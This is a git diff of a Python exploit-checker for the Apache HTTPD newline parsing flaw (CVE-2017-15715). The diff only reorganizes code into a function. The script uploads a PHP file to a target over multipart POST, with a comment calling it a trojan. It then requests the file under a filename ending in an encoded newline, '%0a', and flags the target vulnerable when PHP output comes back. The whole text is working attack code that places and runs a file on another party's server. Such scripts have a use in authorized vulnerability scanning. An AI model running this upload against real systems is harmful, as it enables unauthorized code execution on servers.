@@ -1,15 +1,23 @@
 import requests
 import time, re
 
-filename = '/testing.php%0a'
 
-#数据包头部
-headers = {
-  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
-  'Content-Type': 'multipart/form-data; boundary=---------------------------153388130435749919031880185481'
-  }
-#上传数据
-data = '''-----------------------------153388130435749919031880185481
+
+#上传木马
+def CVE_2017_15715(url):
+    relsult = {
+        'name': 'Apache HTTPD 换行解析漏洞（CVE-2017-15715）',
+        'vulnerable': False
+    }
+    filename = '/testing.php%0a'
+
+    # 数据包头部
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
+        'Content-Type': 'multipart/form-data; boundary=---------------------------153388130435749919031880185481'
+    }
+    # 上传数据
+    data = '''-----------------------------153388130435749919031880185481
 Content-Disposition: form-data; name="file"; filename="testing.php"
 Content-Type: application/octet-stream
 
@@ -22,15 +30,9 @@ testing.php
 
 -----------------------------153388130435749919031880185481--'''
 
-#上传木马
-def CVE_2017_15715(url):
-    relsult = {
-        'name': 'Apache HTTPD 换行解析漏洞（CVE-2017-15715）',
-        'vulnerable': False
-    }
-    respond = requests.post(url, headers=headers,data=data, timeout=3)
-    v = requests.get(url + filename, timeout=3)
     try:
+        respond = requests.post(url, headers=headers,data=data, timeout=3)
+        v = requests.get(url + filename, timeout=3)
         if respond.status_code == 200 and re.search('PHP Version', v.text) and v.status_code == 200:
             relsult['vulnerable'] = True
             relsult['url'] = url
